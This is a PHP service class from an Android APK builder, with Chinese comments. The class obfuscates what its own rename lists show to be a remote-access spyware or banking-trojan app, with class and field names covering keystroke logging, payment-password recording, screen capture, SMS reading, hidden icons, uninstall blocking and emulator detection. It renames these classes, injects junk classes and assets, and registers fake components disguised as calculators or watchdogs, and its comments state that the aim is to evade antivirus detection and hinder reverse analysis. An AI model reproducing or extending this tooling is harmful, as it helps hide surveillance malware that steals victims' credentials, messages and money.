<?php

declare(strict_types=1);

namespace App\Services\ApkBuilder;

use Illuminate\Support\Facades\File;
use RecursiveDirectoryIterator;
use RecursiveIteratorIterator;

final class Obfuscator
{
    /**
     * 旧版 VB.NET RandommMad() 使用的字符集：26 个小写字母。
     * 注意：不使用 Il1O0 leet-speak 字符集，因为那是已知的恶意软件混淆特征，会被 AV 标记。
     */
    private const OBFUSCATION_CHARS = 'qazwsxedcrfvtgbyhnujmikolp';

    /** 心跳间隔（秒）：每隔多少秒触发一次心跳回调 */
    private const HEARTBEAT_INTERVAL_SEC = 10;

    /**
     * 旧版 VB.NET Worker.cs Step2/Step3 中硬编码的类名重命名列表。
     * 只有这些特定的类名会被混淆，而非扫描所有 smali 文件。
     * 使用 RandommMad(5, 13) 生成替换名（5-12 个小写字母）。
     */
    private const CLASS_RENAME_TARGETS = [
        'AccessibilityActivity',
        'AccessServices',
        'HiddenBrowser',
        'AccessTools',
        'ActivityCaptureScreen',
        'ActivityMonitors',
        '_update_app_',
        'Consts',
        'Codes',
        'ChatActivity',
        'CameraCap',
        'Contct_manager',
        'My_Configs',
        'ActivityDraw',
        'My_Crpter',
        'Deviceinfo',
        'filesManager',
        'id_Commands',
        'KeyStorksQ',
        'LiveChat',
        'QueryChats',
        'LiveKeysStrok',
        'StarterServices',
        'LocationMonitor',
        'LockAppsActivity',
        'ActivMain',
        'MyLoger',
        'MyNotification',
        'MyPacket',
        'MySettings',
        'PermissionsActivity',
        'RecordPayPassWord',
        'RequestDraw',
        'MuteUninstall',
        'RequestPermissions2',
        'ScreenCaps',
        'ScreenReceiver',
        'StatusMonitor',
        'UtliTools',
        'NotifyListenService',
        'WorkServices',
        'HiddenActivity',
        'LockActivity',
        'RestrectionActivity',
        'OPPOAutostart',
        'BrodcastActivity',
        'AnUninstall',
        'TransparentActivity',
        'EngineWorker',
        'TransparentLauncherAlias',
        'SIMLauncherAlias',
        'ChromeLauncherAlias',
        'OppoLauncherAlias',
        'VivoLauncherAlias',
        'MuteActivity',
        'AlertActivity',
        'HiddenIco',
        'WebBrowser',
        'Webjector',
        'ClassGen',
        'AudioRecorder',
        'Apps_Manage',
        'BootReceiver',
        'ResetServices',
        'MyJobService',
        'MyWorker',
    ];

    /** 旧版 VB.NET Worker.cs Step3 中的字符串变量名混淆列表 */
    private const STRING_OBFUSCATION_TARGETS = [
        'URL_PING', 'URL_MSG', 'URL_SOCKT', 'getIPAddress', 'USR_MAIL', 'USR_HOST',
        'SPLIT_SKT', 'SPLIT_DATA', 'SPLIT_LINE', 'SPLIT_ARAY', 'USR_NAME', 'DEVICE_ID',
        'Rec_Activitys', 'Rec_Notifications', 'Rec_keystrokes', 'Rec_links', 'Rec_apps',
        'THE_IDF', 'LIVE_KLOG', 'localip', 'SERVER_DIR', 'get_prims', 'get_draw',
        'get_kill', 'get_click', 'Draws_overs', 'User_allPrims', 'HOME_NAME',
        'Use_Access', 'Anti_Kill', 'Click_Prim', 'Auto_Clicker', 'Auto_Prims',
        'Send_Skilton', 'Skeleton_Color', 'Black_Screen', 'Auto_Sreen',
        'Stored_resultCode', 'Stored_intentdata', '_Notfy_TITL_', '_Notfy_MSG_',
        'Tracking_Data_str', 'Notifi_ID', 'My_Access_inst', 'STATUS_MONITOR',
        'LOCK_SERVS', 'PAKET_LOCK', 'MY_COMMANDS_LIST', 'EMIL_POST', 'PHONE_POST',
        'TYPE_POST', 'CUZ_POST', 'DATA_POST', 'Fix_it', 'Get_Network', 'Create_DevicID',
        'IsIgnore_Battery', 'Time_Stamp', 'Accessibility_Service', 'Read_Contacts',
        'Read_SMS', 'Read_Call_Log', 'Acc_Camera', 'Get_Accounts', 'Record_Audio',
        'Call_Phone', 'Call_Record', 'Dcrpt_KET', 'Dcrypt_datas', 'Send_SMS',
        'Set_Wallpaper', 'Doze_Mode', 'Draw_Overlays', 'Package_Installs',
        'is_Access_Enabled', 'Battery_state', 'TempPassLock', 'Blocked_Apps',
        'Lock_App_list', 'Supported_Browsers', 'Dcrpt_Str', 'Get_Cifr', 'get_accss',
        'Gnrat_Ky', 'Mob_Name', 'Access_type', 'Hide_ico', 'auto_start', 'auto_battery',
        'get_btry', 'get_start', 'Anti_emulator', 'get_emu', 'get_hideit',
        'get_accsstype', 'Hide_Type', 'get_hideentype', 'Capture_Lock', 'AsstsKey',
        'get_caplock', 'Is_Store', 'get_storemod', 'Anti_Doze', 'get_dozestate',
        'URL_CASH',
    ];

    private string $buildDir;

    /** @var array<string, true> 已生成的随机名集合，用于碰撞检测 */
    private array $usedNames = [];

    /** @var \Closure|null 心跳回调，长时间操作中定期调用以保持 SSE 连接 */
    private ?\Closure $heartbeatCallback = null;

    /** @var float 上次心跳时间戳 */
    private float $lastHeartbeatTime = 0;

    public function __construct(string $buildDir)
    {
        $this->buildDir = $buildDir;
        $this->lastHeartbeatTime = microtime(true);
    }

    /**
     * 设置心跳回调。在长时间运行的操作中定期调用，防止 SSE 连接超时断开。
     */
    public function setHeartbeatCallback(?\Closure $callback): void
    {
        $this->heartbeatCallback = $callback;
    }

    public function generateJunkClasses(int $classCount, int $methodCount, bool $multiPackage = false): int
    {
        if ($multiPackage) {
            return $this->generateMultiPackageJunkClasses($classCount, $methodCount);
        }

        $smaliDir = $this->buildDir . '/smali';
        $junkPackage = $this->generateUniqueName(8);
        $junkPath = $smaliDir . '/' . $junkPackage;

        File::ensureDirectoryExists($junkPath);

        for ($i = 0; $i < $classCount; $i++) {
            $className = $this->generateUniqueName(6);
            $content = $this->createJunkClass($junkPackage, $className, $methodCount);
            File::put($junkPath . '/' . $className . '.smali', $content);
        }

        return $classCount;
    }

    /**
     * 多包垃圾代码分散 — 对齐旧版 caobizy.apk 的三层分布策略。
     *
     * 旧版特征（caobizy.apk 逆向分析）：
     * - com/ 根目录: 165 个垃圾类（如 com/affufphrygl583.smali）
     * - com/icontrol/: 165 个垃圾类（如 com/icontrol/agenfdzyvdj6025.smali）
     * - com/icontrol/protector/: 165 个垃圾类（如 com/icontrol/protector/tauzqlfxt6290.smali）
     * - 分散到 smali、smali_classes2 ~ smali_classes7 多个 DEX 目录
     * - 类名格式: 小写字母 + 数字后缀
     */
    private function generateMultiPackageJunkClasses(int $classCount, int $methodCount): int
    {
        // 旧版三层包路径
        $packages = [
            'com',
            'com/icontrol',
            'com/icontrol/protector',
        ];

        // 分散到多个 smali 目录（旧版有 smali ~ smali_classes7）
        $smaliDirs = ['smali', 'smali_classes2'];
        foreach (['smali_classes3', 'smali_classes4', 'smali_classes5', 'smali_classes6', 'smali_classes7'] as $dir) {
            if (File::isDirectory($this->buildDir . '/' . $dir)) {
                $smaliDirs[] = $dir;
            }
        }

        $generated = 0;
        $perPackage = $classCount; // 每层都生成 classCount 个

        foreach ($packages as $pkgIndex => $pkg) {
            for ($i = 0; $i < $perPackage; $i++) {
                $dir = $smaliDirs[$i % count($smaliDirs)];
                $basePath = $this->buildDir . '/' . $dir . '/' . $pkg;

                File::ensureDirectoryExists($basePath);

                $className = $this->generateJunkClassName();
                $content = $this->createEnhancedJunkClass($pkg, $className, $methodCount);
                File::put($basePath . '/' . $className . '.smali', $content);
                $generated++;

                $this->emitHeartbeatIfNeeded();
            }
        }

        return $generated;
    }

    private function generateJunkPackageName(): string
    {
        $styles = [
            fn () => $this->generateName(random_int(6, 10)) . random_int(1, 20),
            fn () => $this->generateName(random_int(8, 14)),
            fn () => $this->generateName(4) . random_int(100, 999),
        ];

        return $styles[array_rand($styles)]();
    }

    /**
     * 生成带数字后缀的垃圾类名 — 对齐旧版 caobizy.apk 特征。
     * 旧版格式: 小写字母(8-14位) + 数字后缀(3-4位)，如 affufphrygl583
     */
    private function generateJunkClassName(): string
    {
        $name = $this->generateName(random_int(8, 14));
        $suffix = random_int(500, 9999);

        return $name . $suffix;
    }

    /**
     * 增强版垃圾类 — 对齐旧版 caobizy.apk 中的垃圾类特征。
     *
     * 旧版特征：
     * - 类名: 小写字母 + 数字后缀（如 affufphrygl583）
     * - 字段: f{N}_{28位随机小写}:I = 随机值
     * - 方法: 包含 7 个 const-string 随机长字符串（40-60 字符）
     */
    private function createEnhancedJunkClass(string $package, string $className, int $methodCount): string
    {
        $fullClass = "L{$package}/{$className};";
        $smali = ".class public {$fullClass}\n.super Ljava/lang/Object;\n\n";

        // 旧版: 13 个静态字段，命名 f{N}_{28位随机小写}
        $smali .= "# static fields\n";
        $fieldCount = random_int(10, 14);
        for ($i = 1; $i <= $fieldCount; $i++) {
            $val = random_int(-8, 7);
            $hex = $val >= 0 ? "0x{$val}" : '-0x' . abs($val);
            $smali .= ".field public static f{$i}_{$this->generateName(28)}:I = {$hex}\n\n";
        }

        // 构造函数
        $smali .= "\n# direct methods\n";
        $smali .= ".method public constructor <init>()V\n";
        $smali .= "    .locals 1\n    invoke-direct {p0}, Ljava/lang/Object;-><init>()V\n";
        $smali .= "    return-void\n.end method\n\n";

        for ($i = 0; $i < $methodCount; $i++) {
            $smali .= $this->createEnhancedJunkMethod($this->generateUniqueName(5));
        }

        return $smali;
    }

    private function createEnhancedJunkMethod(string $name): string
    {
        $method = ".method public static {$name}()V\n    .locals 4\n";
        $method .= "    const/4 v0, 0x0\n    const/4 v1, 0x1\n";

        $ops = ['add-int', 'sub-int', 'mul-int', 'xor-int', 'or-int', 'and-int', 'rem-int'];
        $opCount = random_int(3, 6);

        for ($i = 0; $i < $opCount; $i++) {
            $op = $ops[array_rand($ops)];
            $method .= "    {$op} v0, v0, v1\n";
        }

        // 旧版特征: 每个方法包含 7 个 const-string，值为 "do" + 40-60 个随机小写字母
        // 这让垃圾类看起来像真实代码（有字符串常量）
        $stringCount = random_int(5, 8);
        for ($i = 0; $i < $stringCount; $i++) {
            $strLen = random_int(40, 58);
            $randomStr = 'do' . $this->generateName($strLen);
            $method .= "    const-string v0, \"{$randomStr}\"\n";
        }

        // println 调用
        $method .= "    sget-object v2, Ljava/lang/System;->out:Ljava/io/PrintStream;\n";
        $method .= "    invoke-static {v0}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;\n";
        $method .= "    move-result-object v3\n";
        $method .= "    invoke-virtual {v2, v3}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V\n";

        return $method . "    return-void\n.end method\n\n";
    }

    /**
     * 旧版 caobizy.apk 中假组件使用的真实功能名后缀。
     * 伪装成合法应用功能（calculator、watchdog、messenger 等），
     * 让 AV 启发式检测认为这是正常应用。
     */
    private const FAKE_COMPONENT_SUFFIXES = [
        'calculator', 'watchdog', 'messenger', 'scheduler', 'updater',
        'downloader', 'analytics', 'tracker', 'monitor', 'logger',
        'handler', 'manager', 'provider', 'resolver', 'dispatcher',
        'listener', 'observer', 'processor', 'validator', 'formatter',
        'converter', 'parser', 'builder', 'factory', 'adapter',
        'bridge', 'proxy', 'wrapper', 'helper', 'utility',
        'scanner', 'cleaner', 'optimizer', 'backup', 'restore',
        'sync', 'notification', 'alarm', 'timer', 'counter',
        'battery', 'network', 'storage', 'media', 'camera',
    ];

    /**
     * 生成假的 Android 组件并注册到 AndroidManifest.xml — 对齐旧版 caobizy.apk。
     *
     * 旧版特征（caobizy.apk 逆向分析）：
     * 1. 假组件放在 handler/verifier/ 包下（而非 protector 包）
     * 2. 命名格式: opActivity + 真实功能名（如 opActivitycalculator、opServicewatchdog）
     * 3. 15-32 个假组件（activity/service/receiver 混合）
     *
     * @return int 生成的组件数量
     */
    public function generateJunkAndroidComponents(): int
    {
        $manifestPath = $this->buildDir . ApkBuilderConstants::MANIFEST_PATH;
        if (! File::exists($manifestPath)) {
            return 0;
        }

        $smaliDir = $this->buildDir . '/smali';
        $componentTypes = ['activity', 'service', 'receiver'];
        $superClasses = [
            'activity' => 'Landroid/app/Activity;',
            'service' => 'Landroid/app/Service;',
            'receiver' => 'Landroid/content/BroadcastReceiver;',
        ];

        // 旧版: randCompnts.Next(15, 33) 循环 3 次取最后一个值，实际就是 15-32
        $count = random_int(15, 32);

        // 旧版 caobizy.apk: 假组件放在 handler/verifier/ 包下
        $pkg1 = 'handler';
        $pkg2 = 'verifier';
        $junkPath = $smaliDir . '/' . $pkg1 . '/' . $pkg2;
        File::ensureDirectoryExists($junkPath);

        $manifestContent = File::get($manifestPath);
        $usedSuffixes = [];

        // 从 Manifest 提取当前包名作为前缀（modifyManifest 已替换为真实 Play Store 包名）
        $currentPackage = '';
        if (preg_match('/package="([^"]+)"/', $manifestContent, $m)) {
            $currentPackage = $m[1];
        }

        // 找到 </application> 位置，在其前面插入组件声明
        $componentXml = '';
        for ($i = 0; $i < $count; $i++) {
            $type = $componentTypes[random_int(0, count($componentTypes) - 1)];

            // 旧版命名: op + Type + 真实功能名（如 opActivitycalculator）
            $suffix = self::FAKE_COMPONENT_SUFFIXES[array_rand(self::FAKE_COMPONENT_SUFFIXES)];
            // 避免重复
            $key = $type . $suffix;
            if (isset($usedSuffixes[$key])) {
                $suffix .= random_int(2, 99);
                $key = $type . $suffix;
            }
            $usedSuffixes[$key] = true;

            $className = 'op' . ucfirst($type) . $suffix;
            $fullClass = "{$pkg1}/{$pkg2}/{$className}";

            // Manifest 中使用完整包名前缀，确保 Android 能正确解析
            $dottedClass = ! empty($currentPackage)
                ? "{$currentPackage}.{$pkg1}.{$pkg2}.{$className}"
                : "{$pkg1}.{$pkg2}.{$className}";

            // 生成 smali 文件
            $smali = ".class public L{$fullClass};\n";
            $smali .= ".super {$superClasses[$type]}\n\n";

            // 随机字段（旧版 10-14 个）
            $fieldCount = random_int(10, 14);
            for ($f = 0; $f < $fieldCount; $f++) {
                $val = random_int(-8, 7);
                $smali .= ".field public static f{$f}_{$this->generateName(4)}:I = {$val}\n";
            }

            $smali .= "\n.method public constructor <init>()V\n";
            $smali .= "    .locals 0\n";
            $smali .= "    invoke-direct {p0}, {$superClasses[$type]}-><init>()V\n";
            $smali .= "    return-void\n";
            $smali .= ".end method\n\n";

            // 添加组件特定方法
            $smali .= match ($type) {
                'activity' => $this->activityOnCreate(),
                'service' => $this->serviceOnCreate() . "\n" . $this->serviceOnStartCommand(),
                'receiver' => $this->broadcastReceiverOnReceive(),
            };

            File::put($junkPath . '/' . $className . '.smali', $smali);

            // 生成 Manifest 组件声明
            $componentXml .= "        <{$type} android:name=\"{$dottedClass}\" />\n";

            $this->emitHeartbeatIfNeeded();
        }

        // 插入到 </application> 之前
        if (! empty($componentXml) && str_contains($manifestContent, '</application>')) {
            $manifestContent = str_replace(
                '</application>',
                $componentXml . '    </application>',
                $manifestContent
            );
            File::put($manifestPath, $manifestContent);
        }

        return $count;
    }

    private function activityOnCreate(): string
    {
        return ".method protected onCreate(Landroid/os/Bundle;)V\n" .
            "    .locals 0\n" .
            "    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V\n" .
            "    return-void\n" .
            ".end method\n";
    }

    private function serviceOnCreate(): string
    {
        return ".method public onCreate()V\n" .
            "    .locals 0\n" .
            "    invoke-super {p0}, Landroid/app/Service;->onCreate()V\n" .
            "    return-void\n" .
            ".end method\n";
    }

    private function serviceOnStartCommand(): string
    {
        return ".method public onStartCommand(Landroid/content/Intent;II)I\n" .
            "    .locals 1\n" .
            "    const/4 v0, 1\n" .
            "    return v0\n" .
            ".end method\n";
    }

    private function broadcastReceiverOnReceive(): string
    {
        return ".method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V\n" .
            "    .locals 0\n" .
            "    return-void\n" .
            ".end method\n";
    }

    /**
     * 注入随机垃圾文件到 assets 目录 — 对齐旧版 Worker.cs InjectRandomJunkFiles()。
     *
     * 旧版特征（caobizy.apk 逆向分析）：
     * - 文件名格式: c_ + 8位hex + .png/.xml
     * - PNG: 25-30 x 10-20 像素的随机颜色图片
     * - XML: 包含随机 GUID 和数字的假数据
     * - 数量: 6-15 个文件
     *
     * @return int 生成的文件数量
     */
    public function injectRandomJunkFiles(): int
    {
        $assetsPath = $this->buildDir . ApkBuilderConstants::ASSETS_PATH;

        if (! File::isDirectory($assetsPath)) {
            File::ensureDirectoryExists($assetsPath);
        }

        $count = random_int(6, 15);

        for ($i = 0; $i < $count; $i++) {
            $hex = bin2hex(random_bytes(4)); // 8 hex chars
            $isXml = random_int(0, 1) === 0;

            if ($isXml) {
                $filename = "c_{$hex}.xml";
                $guid1 = $this->fakeGuid();
                $guid2 = $this->fakeGuid();
                $guid3 = $this->fakeGuid();
                $num1 = random_int(1000, 9999);
                $num2 = random_int(1000, 9999);
                $num3 = random_int(1000, 9999);
                $content = "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<items>\n" .
                    "  <item>{$guid1}</item>\n  <itemx>{$guid2}</itemx>\n  <itemy>{$guid3}</itemy>\n" .
                    "  <flag>{$num1}</flag>\n  <flag>{$num2}</flag>\n  <flag>{$num3}</flag>\n" .
                    "</items>";
                File::put($assetsPath . '/' . $filename, $content);
            } else {
                $filename = "c_{$hex}.png";
                $width = random_int(25, 30);
                $height = random_int(10, 20);
                $img = imagecreatetruecolor($width, $height);
                for ($x = 0; $x < $width; $x++) {
                    for ($y = 0; $y < $height; $y++) {
                        $color = imagecolorallocate($img, random_int(0, 255), random_int(0, 255), random_int(0, 255));
                        imagesetpixel($img, $x, $y, $color);
                    }
                }
                imagepng($img, $assetsPath . '/' . $filename);
                imagedestroy($img);
            }
        }

        return $count;
    }

    private function fakeGuid(): string
    {
        return sprintf(
            '%s-%s-%s-%s-%s',
            bin2hex(random_bytes(4)),
            bin2hex(random_bytes(2)),
            bin2hex(random_bytes(2)),
            bin2hex(random_bytes(2)),
            bin2hex(random_bytes(6))
        );
    }

    /**
     * 混淆类名 — 严格对齐旧版 VB.NET Worker.cs Step2/Step3 行为。
     *
     * 旧版行为：
     * 1. 使用硬编码的 ~50 个类名列表（CLASS_RENAME_TARGETS）
     * 2. 用 RandommMad(5, 13) 生成替换名（5-12 个小写字母，字符集 qazwsxedcrfvtgbyhnujmikolp）
     * 3. 在 smali 文件内容中做 str_replace 替换类名引用
     * 4. 重命名对应的 smali 文件
     * 5. 只处理 com/icontrol/protector 包下的文件（以及所有 smali 目录的引用替换）
     * 6. 跳过 android/ 和 androidx/ 目录
     */
    public function shuffleClassNames(): int
    {
        // 为每个目标类名生成随机替换名（旧版 RandommMad(5, 13) = 5-12 个字符）
        $classMap = [];
        foreach (self::CLASS_RENAME_TARGETS as $className) {
            $newName = $this->generateUniqueName(random_int(5, 12));
            $classMap[$className] = $newName;
        }

        $smaliDirs = array_slice(ApkBuilderConstants::SMALI_DIRS, 0, 4);

        // 第一遍：替换所有 smali 文件中的类名引用（跳过 android/ 和 androidx/）
        foreach ($smaliDirs as $smaliDir) {
            $basePath = $this->buildDir . '/' . $smaliDir;

            if (! File::isDirectory($basePath)) {
                continue;
            }

            $iterator = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($basePath, RecursiveDirectoryIterator::SKIP_DOTS)
            );

            foreach ($iterator as $file) {
                if (! $file->isFile() || $file->getExtension() !== 'smali') {
                    continue;
                }

                // 旧版跳过 android/ 和 androidx/ 目录
                $relativePath = $file->getPathname();
                if (str_contains($relativePath, '/android/') || str_contains($relativePath, '/androidx/')) {
                    continue;
                }

                $content = File::get($file->getPathname());
                $modified = false;

                foreach ($classMap as $old => $new) {
                    if (str_contains($content, $old)) {
                        $content = str_replace($old, $new, $content);
                        $modified = true;
                    }
                }

                if ($modified) {
                    File::put($file->getPathname(), $content);
                }

                $this->emitHeartbeatIfNeeded();
            }
        }

        // 第二遍：重命名 smali 文件（旧版只在 com/icontrol/protector 目录下重命名）
        foreach ($smaliDirs as $smaliDir) {
            $basePath = $this->buildDir . '/' . $smaliDir;
            $protectorPath = $basePath . '/com/icontrol/protector';

            if (! File::isDirectory($protectorPath)) {
                continue;
            }

            $files = File::files($protectorPath);
            foreach ($files as $file) {
                $filename = $file->getFilename();
                foreach ($classMap as $old => $new) {
                    if (str_contains($filename, $old)) {
                        $newFilename = str_replace($old, $new, $filename);
                        $newPath = $protectorPath . '/' . $newFilename;
                        if ($file->getPathname() !== $newPath) {
                            File::move($file->getPathname(), $newPath);
                        }
                        break;
                    }
                }
            }
        }

        // 更新 AndroidManifest.xml 中的类名引用
        $manifestPath = $this->buildDir . ApkBuilderConstants::MANIFEST_PATH;
        if (File::exists($manifestPath)) {
            $content = File::get($manifestPath);
            $modified = false;
            foreach ($classMap as $old => $new) {
                if (str_contains($content, $old)) {
                    $content = str_replace($old, $new, $content);
                    $modified = true;
                }
            }
            if ($modified) {
                File::put($manifestPath, $content);
            }
        }

        return count($classMap);
    }

    /**
     * 字符串变量名混淆 — 对应旧版 VB.NET Worker.cs Step3 的字符串混淆。
     *
     * 将 smali 代码中的已知字段名/变量名替换为随机字符串，
     * 增加逆向分析难度。
     *
     * @return int 替换的字符串数量
     */
    public function obfuscateStrings(): int
    {
        $smaliDirs = array_slice(ApkBuilderConstants::SMALI_DIRS, 0, 4);
        $stringMap = $this->buildStringObfuscationMap();
        $totalReplacements = 0;

        foreach ($smaliDirs as $smaliDir) {
            $basePath = $this->buildDir . '/' . $smaliDir;

            if (! File::isDirectory($basePath)) {
                continue;
            }

            $iterator = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($basePath, RecursiveDirectoryIterator::SKIP_DOTS)
            );

            foreach ($iterator as $file) {
                if (! $file->isFile() || $file->getExtension() !== 'smali') {
                    continue;
                }

                $content = File::get($file->getPathname());
                $modified = false;

                foreach ($stringMap as $original => $replacement) {
                    if (str_contains($content, $original)) {
                        $content = str_replace($original, $replacement, $content);
                        $modified = true;
                    }
                }

                if ($modified) {
                    File::put($file->getPathname(), $content);
                    $totalReplacements++;
                }

                $this->emitHeartbeatIfNeeded();
            }
        }

        return $totalReplacements;
    }

    // ========== 字符串混淆核心 ==========

    /**
     * 构建字符串混淆映射表：原始变量名 → 随机替换名。
     *
     * @return array<string, string>
     */
    private function buildStringObfuscationMap(): array
    {
        $map = [];
        $chars = 'qazwsxedcrfvtgbyhnujmikolp';

        foreach (self::STRING_OBFUSCATION_TARGETS as $target) {
            $length = random_int(8, 16);
            $replacement = '';
            for ($i = 0; $i < $length; $i++) {
                $replacement .= $chars[random_int(0, strlen($chars) - 1)];
            }
            $map[$target] = $replacement;
        }

        return $map;
    }

    // ========== 工具方法 ==========

    /**
     * 如果距离上次心跳超过间隔时间，触发心跳回调。
     */
    private function emitHeartbeatIfNeeded(): void
    {
        if ($this->heartbeatCallback === null) {
            return;
        }

        $now = microtime(true);
        if (($now - $this->lastHeartbeatTime) >= self::HEARTBEAT_INTERVAL_SEC) {
            ($this->heartbeatCallback)();
            $this->lastHeartbeatTime = $now;
        }
    }

    private function generateName(int $length): string
    {
        $chars = self::OBFUSCATION_CHARS;
        $charLen = strlen($chars);
        $name = '';

        for ($i = 0; $i < $length; $i++) {
            $name .= $chars[random_int(0, $charLen - 1)];
        }

        return $name;
    }

    /**
     * 生成唯一的随机名（带碰撞检测）。
     */
    private function generateUniqueName(int $length): string
    {
        for ($attempt = 0; $attempt < 50; $attempt++) {
            $name = $this->generateName($length);
            if (! isset($this->usedNames[$name])) {
                $this->usedNames[$name] = true;

                return $name;
            }
        }

        // fallback: 加长度
        return $this->generateName($length + 4);
    }

    private function createJunkClass(string $package, string $className, int $methodCount): string
    {
        $fullClass = "L{$package}/{$className};";
        $smali = ".class public {$fullClass}\n.super Ljava/lang/Object;\n\n";

        $fieldTypes = ['I', 'Z', 'J', 'Ljava/lang/String;'];
        $fieldCount = random_int(3, 8);

        for ($i = 0; $i < $fieldCount; $i++) {
            $type = $fieldTypes[array_rand($fieldTypes)];
            $smali .= ".field private {$this->generateUniqueName(4)}:{$type}\n";
        }

        $smali .= "\n.method public constructor <init>()V\n";
        $smali .= "    .locals 1\n    invoke-direct {p0}, Ljava/lang/Object;-><init>()V\n";
        $smali .= "    return-void\n.end method\n\n";

        for ($i = 0; $i < $methodCount; $i++) {
            $smali .= $this->createJunkMethod($this->generateUniqueName(5));
        }

        return $smali;
    }

    private function createJunkMethod(string $name): string
    {
        $method = ".method public {$name}()V\n    .locals 3\n";
        $method .= "    const/4 v0, 0x0\n    const/4 v1, 0x1\n";

        $ops = ['add-int', 'sub-int', 'mul-int', 'xor-int'];
        $opCount = random_int(2, 4);

        for ($i = 0; $i < $opCount; $i++) {
            $op = $ops[array_rand($ops)];
            $method .= "    {$op} v0, v0, v1\n";
        }

        return $method . "    return-void\n.end method\n\n";
    }
}
